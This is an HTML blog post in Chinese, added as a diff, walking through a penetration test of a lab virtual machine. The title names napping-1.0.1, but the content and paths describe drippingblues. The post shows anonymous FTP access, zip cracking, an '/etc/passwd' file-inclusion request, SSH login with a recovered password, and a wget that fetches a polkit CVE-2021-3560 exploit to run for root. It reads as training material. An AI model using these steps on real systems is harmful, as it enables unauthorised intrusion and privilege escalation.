@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html class="dark" lang="zh-CN" prefix="og: http://ogp.me/ns# 
+fb: http://ogp.me/ns/fb#
+article: http://ogp.me/ns/article#">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="keywords" content="">
+
+<title>对napping-1.0.1的渗透测试 || woejk0x&#39;s blogs</title>
+<link rel="icon" href="https://wo3jk.github.ioimages/wang.icon" type="image/x-icon">
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<meta property="og:title" content="对napping-1.0.1的渗透测试">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://wo3jk.github.io/2026/02/07/%E5%AF%B9drippingblues%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/index.html">
+<meta property="og:image" content="">
+<meta property="og:site_name" content="woejk0x&#39;s blogs">
+<meta property="og:author" content="woejk0x">
+
+  
+  
+  
+  <meta name="description" content="信息收集主机发现arp-scan-l端口扫描nmap-sV-p-192.168.59.15221&amp;#x2F;tcp-FTP服务（vsftpd3.0.3）服务版本：vsftpd3.0.3（一款轻量型FTP服务器，主流且稳定性高，但需关注配置安全性）关键风险（高风险）：允许匿名登录：通过ftp-anon脚本探测确">
+
+
+<script src="/js/wang.js"></script>
+
+<link rel="stylesheet" href="/css/wang.css">
+<script> console.log("Hello hexo-theme-wang"); </script>
+<meta name="generator" content="Hexo 8.1.1"></head>
+<body>
+<main>
+    <div id="agplAlert" style="z-index: 9999;">
+    <strong>请遵守AGPL 3.0协议</strong> 本主题已开源于<a target="_blank" rel="noopener" href="https://github.com/xingwangzhe/hexo-theme-wang">hexo-theme-wang</a>
+</div>
+    <header>
+    <nav>
+        <ul>
+            
+                <li>
+                    <a href="/" rel="noopener">
+                        
+                            <img src="/images/menu_ico/home.svg" class="menu-icon" alt="首页">
+                        
+                        首页
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/archives" rel="noopener">
+                        
+                            <img src="/images/menu_ico/archives.svg" class="menu-icon" alt="归档">
+                        
+                        归档
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/categories" rel="noopener">
+                        
+                            <img src="/images/menu_ico/categories.svg" class="menu-icon" alt="分类">
+                        
+                        分类
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/tags" rel="noopener">
+                        
+                            <img src="/images/menu_ico/tags.svg" class="menu-icon" alt="标签">
+                        
+                        标签
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/about" rel="noopener">
+                        
+                            <img src="/images/menu_ico/about.svg" class="menu-icon" alt="关于">
+                        
+                        关于
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/links" rel="noopener">
+                        
+                            <img src="/images/menu_ico/links.svg" class="menu-icon" alt="友链">
+                        
+                        友链
+                    </a>
+                </li>
+            
+            
+        </ul>
+    </nav>
+</header>
+
+<script src="/js/header.js"></script>
+
+
+    
+    <aside class="sidebar-container sidebar-left">
+    <div class="sidebar-bg">
+        <h2 class="site-title">woejk0x's blogs</h2>
+        <img class="avatar avatar-round" src="/images/Myblogs.jpg" style="width:50px;" alt="网站头像">
+        <h2 class="site-author">woejk0x</h2>
+        <h3 class="site-subtitle">网络安全爱好者，目标是成为一名优秀的渗透测试工程师</h3>
+    </div>
+    <div class="sidebar-bg">
+        <ul class="social_links">
+            
+                <li>
+                    <a target="_blank" rel="noopener" href="https://github.com/Wo3jk" aria-label="Github的链接">
+                        
+                            <div style="display: flex; margin-left: auto; margin-left: auto; justify-content: center;">
+                                <img src="/images/social_links/github.svg" class="icon" alt="Github的图标"><p>Github</p>
+                            </div>
+                        
+                    </a>
+                </li>
+            
+        </ul>
+    </div>
+</aside>
+<div class="post-container">
+  <article class="post">
+    <h1 class="post-title">对napping-1.0.1的渗透测试</h1>
+
+    <div class="post-meta">
+      <span class="post-date">发布于 <time datetime="2026-02-07T04:00:00.000Z">2026-02-07</time></span>
+      
+        <span class="post-categories">
+          分类：<a class="category-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>, <a class="category-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E9%9D%B6%E6%9C%BA%E6%97%A5%E8%AE%B0/">靶机日记</a>
+        </span>
+      
+      
+        <span class="post-updated">
+          最后更新于 <time datetime="2026-02-07T04:21:53.315Z">2026-02-07</time>
+        </span>
+      
+      <span style="margin-left:10px;">👁<span id="busuanzi_value_page_pv"></span></span>
+    </div>
+    <div class="post-content">
+      <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><p><code>arp-scan -l</code><br><img src="/%E5%AF%B9drippingblues%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260206112824.png"></p>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><code>nmap -sV -p- 192.168.59.152</code><br><img src="/%E5%AF%B9drippingblues%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260206115654.png"></p>
+<ol>
+<li><strong>21&#x2F;tcp - FTP 服务（vsftpd 3.0.3）</strong><br><em>服务版本：vsftpd 3.0.3（一款轻量型 FTP 服务器，主流且稳定性高，但需关注配置安全性）</em><br><em>关键风险（高风险）：</em><br><em>允许匿名登录：通过ftp-anon脚本探测确认，匿名用户可直接登录（FTP 响应码 230，代表登录成功），无需账号密码即可访问 FTP 目录。</em><br><em>存在可写文件：匿名用户可见respectmydrip.zip文件（权限-rwxrwxrwx，即所有用户（所有者 &#x2F; 组 &#x2F; 其他）均有读、写、执行权限），攻击者可通过匿名登录修改 &#x2F; 删除该文件，甚至上传恶意文件（如后门、病毒）。</em><br><em>其他配置：数据连接与控制连接均为 “明文传输”（无 SSL&#x2F;TLS 加密），登录凭证（若使用非匿名账号）和文件内容可能被局域网嗅探窃取。</em></li>
+<li><strong>22&#x2F;tcp - SSH 服务（OpenSSH 8.2p1 Ubuntu 4ubuntu0.3）</strong><br><em>服务版本：OpenSSH 8.2p1（Ubuntu 系统默认版本，对应 Ubuntu 20.04 LTS，无已知高危漏洞（如 Heartbleed、Shellshock），版本安全性中等）</em><br><em>密钥配置：</em><br><em>支持 3 类主机密钥：RSA（3072 位，主流安全长度）、ECDSA（256 位）、ED25519（256 位，椭圆曲线算法，安全性更高），密钥长度符合现代安全标准，无 “短密钥” 风险。</em><br><em>潜在风险（中风险）：</em><br><em>未禁用 “密码登录”：扫描未显示PasswordAuthentication no配置，默认可能允许通过密码登录，若管理员使用弱密码（如 123456、admin），易遭暴力破解。</em><br><em>未限制 “root 直接登录”：若未配置PermitRootLogin no，攻击者可能直接尝试破解 root 账号，风险更高。</em></li>
+<li><strong>80&#x2F;tcp - HTTP 服务（Apache httpd 2.4.41 (Ubuntu)）</strong><br><em>服务版本：Apache 2.4.41（Ubuntu 系统版本，无重大已知漏洞，兼容性与稳定性较好）</em><br><em>关键信息：</em><br><em>网站标题：无明确标题（Site doesn’t have a title），内容类型为text&#x2F;html; charset&#x3D;UTF-8，可能是测试页面或极简网站。</em><br><em>robots.txt 配置：存在 2 条禁止访问规则（Disallow: &#x2F;dripisreal.txt、Disallow: &#x2F;etc&#x2F;dripispowerful.html）：</em><br><em>dripisreal.txt：推测为敏感文本文件（如配置说明、密钥、路径清单），通过Disallow限制爬虫访问，但攻击者可直接尝试访问（如<a target="_blank" rel="noopener" href="http://192.168.23.129/dripisreal.txt%EF%BC%89%E3%80%82">http://192.168.23.129/dripisreal.txt）。</a></em><br><em>&#x2F;etc&#x2F;dripispowerful.html：路径含&#x2F;etc&#x2F;（Linux 系统核心配置目录），异常且危险 —— 若 Apache 配置错误（如目录遍历漏洞），可能导致&#x2F;etc&#x2F;下的系统配置文件（如passwd、shadow）泄露。</em><br><em>潜在风险（中风险）：</em><br><em>未启用 HTTPS（无 443&#x2F;tcp 开放端口），HTTP 明文传输可能导致页面内容被篡改、用户数据被嗅探。</em><br><em>robots.txt“欲盖弥彰”：禁止访问的路径反而成为攻击者的重点探测目标，需验证这些路径是否真的存在敏感信息。</em><br>尝试ftp匿名登录一下，anonymous<br><img src="/%E5%AF%B9drippingblues%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260206140906.png"><br>登陆成功，信息收集一下。下载里面的压缩包<br><img src="/%E5%AF%B9drippingblues%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260206140950.png"><br>解压压缩包需要密码<br><img src="/%E5%AF%B9drippingblues%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260206141317.png"><br>直接尝试进行暴力破解<br><code>fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u respectmydrip.zip</code><br><img src="/%E5%AF%B9drippingblues%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260206141648.png"><br>解压成功<br><img src="/%E5%AF%B9drippingblues%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260206141940.png"><br>打开之后虽然得到提示，但是里面的压缩包依然需要密码<br><img src="/%E5%AF%B9drippingblues%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260206142006.png"></li>
+</ol>
+<h1 id="Web渗透"><a href="#Web渗透" class="headerlink" title="Web渗透"></a>Web渗透</h1><p><img src="/%E5%AF%B9drippingblues%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260206142136.png"><br>提示是黑客挑衅的一段话，可以知道用户名thugger 。再扫描枚举网站子目录<br><code>gobuster dir -u http://192.168.59.152/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php,zip -b 404,403</code><br><img src="/%E5%AF%B9drippingblues%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260206143146.png"><br><img src="/%E5%AF%B9drippingblues%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260206143203.png"><br>得到两个敏感目录文件夹<br><img src="/%E5%AF%B9drippingblues%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260206143246.png"><br><em>你好，亲爱的准黑客：<br>去看看这段歌词：<br>AZLyrics - request for access<br>数一数其中包含 “n” 字母的单词，将这些单词并排放在一起，然后对这个组合后的文本进行 MD5 哈希运算。<br>示例：若文本是 “hellohellohellohello”，则对 “hellohellohellohello” 执行 MD5 哈希运算<br>这就是 SSH 的密码。</em><br>在respectmydrip.txt中提示我们关注drip，那么这可能是一个GET传参的值，就可以通过这进行测试。看有无文件包含漏洞<br><code>/index.php?drip=/etc/passwd</code><br><img src="/%E5%AF%B9drippingblues%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260206143514.png"><br>存在文件包含漏洞，再尝试包含&#x2F;etc&#x2F;dripispowerful.html<br><img src="/%E5%AF%B9drippingblues%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260206143538.png"><br>查看源码就能得到账户密码<code>imdrippinbiatch</code><br><img src="/%E5%AF%B9drippingblues%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260206143605.png"><br>然后进行ssh登录<br><code>ssh thugger@192.168.59.152</code><br><img src="/%E5%AF%B9drippingblues%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260206143715.png"><br>登录成功，然后开始信息收集，得到第一个flag<br><img src="/%E5%AF%B9drippingblues%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260206143851.png"><br><img src="/%E5%AF%B9drippingblues%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260206144006.png"><br><code>sudo -l</code>需要密码<br><code>find / -perm -u=s -type f 2&gt;/dev/null</code><br><img src="/%E5%AF%B9drippingblues%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260206144034.png"><br>没有可以提权漏洞利用的地方，<br><code>ps -ef</code>         <br><code>ps -ef | grep root</code><br><img src="/%E5%AF%B9drippingblues%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260206144818.png"><br>发现polkid，搜索其存在的内核漏洞以待提权。</p>
+<h2 id="关于-polkitd-的详细解析"><a href="#关于-polkitd-的详细解析" class="headerlink" title="关于 polkitd 的详细解析"></a>关于 polkitd 的详细解析</h2><p>在执行系统进程查看时，如果发现了 polkitd 进程，通常意味着系统正在运行 <strong>PolicyKit</strong> 权限管理服务。以下是关于它的详细介绍：</p>
+<h3 id="1-什么是-polkitd"><a href="#1-什么是-polkitd" class="headerlink" title="1. 什么是 polkitd"></a>1. 什么是 polkitd</h3><p><strong>polkitd</strong> 是 <strong>PolicyKit (polkit)</strong> 框架的守护进程（Daemon）。<br>Polkit 是 Linux 系统中的一种权限管理组件，用于在<strong>非特权用户</strong>与<strong>系统级操作</strong>之间提供安全的授权机制。它的作用类似于 sudo，但比 sudo 更细粒度、更面向服务，广泛应用于桌面环境（如 GNOME、KDE）和系统服务（如 systemd、NetworkManager、udisks2 等）。<br>polkitd 通常以后台进程运行，监听来自系统服务的授权请求，并根据策略判断是否允许用户执行特定操作。</p>
+<h3 id="2-polkitd-的工作机制"><a href="#2-polkitd-的工作机制" class="headerlink" title="2. polkitd 的工作机制"></a>2. polkitd 的工作机制</h3><ol>
+<li><strong>用户或进程请求敏感操作</strong>：例如普通用户想要挂载磁盘、修改网络配置或重启服务。</li>
+<li><strong>系统服务发起请求</strong>：系统服务（如 udisks2）会调用 polkit 请求判断该用户是否有权执行此操作。</li>
+<li><strong>polkitd 做出决策</strong>：polkitd 收到请求后，会根据<strong>策略配置</strong>（Policy Files &#x2F; Actions）和当前<strong>用户身份</strong>进行判断。</li>
+<li><strong>决策结果</strong>：<ul>
+<li><strong>允许 (yes)</strong>：用户有足够权限，操作直接执行。</li>
+<li><strong>拒绝 (no)</strong>：用户没有权限，操作失败。</li>
+<li><strong>需要认证 (auth)</strong>：提示用户输入密码（通常弹出 GUI 对话框或在命令行提示）。</li>
+</ul>
+</li>
+</ol>
+<h3 id="3-配置文件与组件"><a href="#3-配置文件与组件" class="headerlink" title="3. 配置文件与组件"></a>3. 配置文件与组件</h3><ul>
+<li><strong>配置文件目录</strong>：<ul>
+<li>&#x2F;usr&#x2F;share&#x2F;polkit-1&#x2F;actions&#x2F;：系统服务定义的操作权限（XML 格式）。</li>
+<li>&#x2F;etc&#x2F;polkit-1&#x2F;rules.d&#x2F;：管理员自定义的权限规则（JavaScript 格式）。</li>
+<li>&#x2F;usr&#x2F;share&#x2F;polkit-1&#x2F;rules.d&#x2F;：系统提供的默认规则。</li>
+</ul>
+</li>
+<li><strong>相关工具命令</strong>：<ul>
+<li>pkaction：列出系统中注册的所有 polkit 操作。</li>
+<li>pkcheck：检查某个操作是否被允许。</li>
+<li>pkexec：类似于 sudo，用于以 root 权限运行特定命令。</li>
+</ul>
+</li>
+</ul>
+<h3 id="4-安全角色与提权风险"><a href="#4-安全角色与提权风险" class="headerlink" title="4. 安全角色与提权风险"></a>4. 安全角色与提权风险</h3><ul>
+<li><strong>最小权限原则</strong>：Polkit 允许普通用户不直接获取完整的 root 权限，而是仅针对特定操作获取授权，提高了系统安全性。</li>
+<li><strong>提权风险</strong>：<br>  由于 polkitd 是一个以高权限（通常是 root）运行的守护进程，且涉及复杂的逻辑处理，历史上曾出现过多个高危漏洞。<ul>
+<li><strong>常见漏洞案例</strong>：例如 <strong>CVE-2021-3560</strong>（本地权限提升漏洞），攻击者可以通过利用 polkit 在处理连接断开时的逻辑缺陷，无需密码即可获得 root 权限。</li>
+<li><strong>渗透测试重点</strong>：在渗透测试中，如果发现系统版本较老或 polkit 未打补丁，它是寻找本地提权（LPE）漏洞的首选目标之一。</li>
+</ul>
+</li>
+</ul>
+<h3 id="5-常见应用场景"><a href="#5-常见应用场景" class="headerlink" title="5. 常见应用场景"></a>5. 常见应用场景</h3><ul>
+<li><strong>桌面环境</strong>：控制用户是否有权挂载 USB 设备、修改 Wi-Fi 设置、关机或重启。</li>
+<li><strong>系统服务</strong>：管理防火墙规则（firewalld）、软件包更新（packagekit）。</li>
+<li><strong>容器与虚拟化</strong>：通过 polkit 控制虚拟机和容器的管理权限。</li>
+</ul>
+<hr>
+<p>先获取到exp脚本 <a target="_blank" rel="noopener" href="https://github.com/Almorabea/Polkit-exploit" title="GitHub - Almorabea&#x2F;Polkit-exploit: Privilege escalation with polkit - CVE-2021-3560">GitHub - Almorabea&#x2F;Polkit-exploit: Privilege escalation with polkit - CVE-2021-3560</a><br>然后开启http访问供靶机下载<br><img src="/%E5%AF%B9drippingblues%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260206145559.png"><br><code>wget http://192.168.59.128:80/CVE-2021-3560.py</code><br><img src="/%E5%AF%B9drippingblues%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260206145832.png"><br><code>python3 CVE-2021-3560.py</code><br><img src="/%E5%AF%B9drippingblues%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260207115652.png"><br>成功提权成为root<br><img src="/%E5%AF%B9drippingblues%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260207115713.png"></p>
+
+    </div>
+  </article>
+  <div class="ccbyncsa">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-12">
+                <div class="copyright">
+                    <div class="author">
+                        <p>作者</p>
+                        <p>woejk0x</p>
+                    </div>
+                    <div class="title">
+                        <p>标题</p>
+                        <p>对napping-1.0.1的渗透测试</p>
+                    </div>
+                        <div class="publish">
+                            <p>发布于</p>
+                            <p>2026-02-07</p>
+                        </div>
+                    <div class="ccbyncsa-icon">
+                        <p>授权协议</p>
+                        <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                        <p class="ccbyncsa-icon-imgs" style="display: flex;">
+                        <img src="/images/cc.svg" alt="cc">
+                        <img src="/images/by.svg" alt="by">
+                        <img src="/images/nc.svg" alt="nc">
+                        <img src="/images/sa.svg" alt="sa">
+                        </p>
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+  <nav class="post-pagination">
+    
+      <div class="post-prev">
+        <span class="nav-label">上一篇</span>
+        <a href="/2026/02/05/%E5%AF%B9Corrosion2%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">对Corrosion2的渗透测试</a>
+      </div>
+    
+    
+  </nav>
+  
+
+</div>
+
+<script src="/js/copy.js"></script>
+
+<aside class="sidebar-container sidebar-right">
+    <div class="sidebar-bg">
+        <p id="date"></p>
+<script>
+  function updateDate() {
+    var now = new Date();
+    var dateString = now.toISOString().slice(0, 10);
+    document.getElementById('date').textContent = dateString;
+  }
+
+  window.addEventListener('load', function() {
+    updateDate();
+    // 更新频率为每5分钟更新一次，减少不必要的更新
+    setInterval(updateDate, 300000);
+  });
+</script>
+        <span id="clock" role="timer" aria-live="polite"></span>
+
+
+<script>
+  document.addEventListener('DOMContentLoaded', function() {
+    const clockElement = document.getElementById('clock');
+    let timerInterval;
+
+    // 格式化时间函数
+    function formatTime(unit) {
+      return unit < 10 ? '0' + unit : unit;
+    }
+
+    // 更新时钟 - 包含秒
+    function updateClock() {
+      const now = new Date();
+      const hours = formatTime(now.getHours());
+      const minutes = formatTime(now.getMinutes());
+      const seconds = formatTime(now.getSeconds());
+      clockElement.textContent = `${hours}:${minutes}:${seconds}`;
+    }
+
+    // 初始化时钟
+    function startClock() {
+      // 立即更新一次时间
+      updateClock();
+      // 每秒更新一次
+      timerInterval = setInterval(updateClock, 1000);
+    }
+
+    // 页面可见性变化时的优化
+    document.addEventListener('visibilitychange', function() {
+      if (document.hidden) {
+        // 页面不可见时停止更新
+        clearInterval(timerInterval);
+      } else {
+        // 页面重新可见时，重新开始
+        clearInterval(timerInterval);
+        startClock();
+      }
+    });
+
+    // 启动时钟
+    startClock();
+  });
+</script>
+
+
+    </div>
+    <div class="sidebar-bg">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-number">1.1.</span> <span class="toc-text">主机发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.</span> <span class="toc-text">端口扫描</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text">Web渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E-polkitd-%E7%9A%84%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90"><span class="toc-number">2.1.</span> <span class="toc-text">关于 polkitd 的详细解析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BB%80%E4%B9%88%E6%98%AF-polkitd"><span class="toc-number">2.1.1.</span> <span class="toc-text">1. 什么是 polkitd</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-polkitd-%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%9C%BA%E5%88%B6"><span class="toc-number">2.1.2.</span> <span class="toc-text">2. polkitd 的工作机制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%B8%8E%E7%BB%84%E4%BB%B6"><span class="toc-number">2.1.3.</span> <span class="toc-text">3. 配置文件与组件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%AE%89%E5%85%A8%E8%A7%92%E8%89%B2%E4%B8%8E%E6%8F%90%E6%9D%83%E9%A3%8E%E9%99%A9"><span class="toc-number">2.1.4.</span> <span class="toc-text">4. 安全角色与提权风险</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E5%B8%B8%E8%A7%81%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-number">2.1.5.</span> <span class="toc-text">5. 常见应用场景</span></a></li></ol></li></ol></li></ol>
+    </div>
+    <div class="sidebar-bg">
+        <div class="card-tags">
+            
+                <a href="/tags/%E6%A8%A1%E6%8B%9F/" class="tag" aria-label="标签: #模拟">#模拟</a>
+            
+                <a href="/tags/Easy/" class="tag" aria-label="标签: #Easy">#Easy</a>
+            
+        </div>
+    </div>
+    <div>
+        <div class="categories-list">
+            
+                <div class="category-item">
+                    <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" aria-label="分类: 内网渗透">
+                        内网渗透
+                        <span>(14)</span>
+                    </a>
+                </div>
+            
+                <div class="category-item">
+                    <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E9%9D%B6%E6%9C%BA%E6%97%A5%E8%AE%B0/" aria-label="分类: 靶机日记">
+                        靶机日记
+                        <span>(14)</span>
+                    </a>
+                </div>
+            
+        </div>
+    </div>
+</aside>
+
+    <!-- No categories available -->
+
+
+    <footer>
+    <span id="busuanzi_container_site_pv" style="display: inline;"></span>
+    <span>👁<span id="busuanzi_value_site_pv"></span></span>
+    <div class="padding border border-sub border-dotted fadein-right">
+        <span style="color:aliceblue">👤<span id="busuanzi_value_site_uv"></span></span>
+    </div>
+    <span>
+        由 <a target="_blank" rel="noopener" href="https://hexo.io" alt="Hexo">
+            <p class="hover-underline night" style="display: inline;">Hexo</p>
+        </a> 驱动
+        <p style="display: inline; color: red;">❤</p>
+        <a target="_blank" rel="noopener" href="https://github.com/xingwangzhe/hexo-theme-wang" alt="Wang">
+            <p class="hover-underline night" style="display: inline;">Wang</p>
+        </a> 主题构建
+    </span>
+
+    <!-- 带图片的链接 -->
+    <div class="footer-links">
+        
+    </div>
+
+    <!-- 纯文本链接 -->
+    <div class="footer-text-links">
+        
+    </div>
+</footer>
+    
+<script src="/js/background.js"></script>
+    
+</main>
+</body>
+</html>
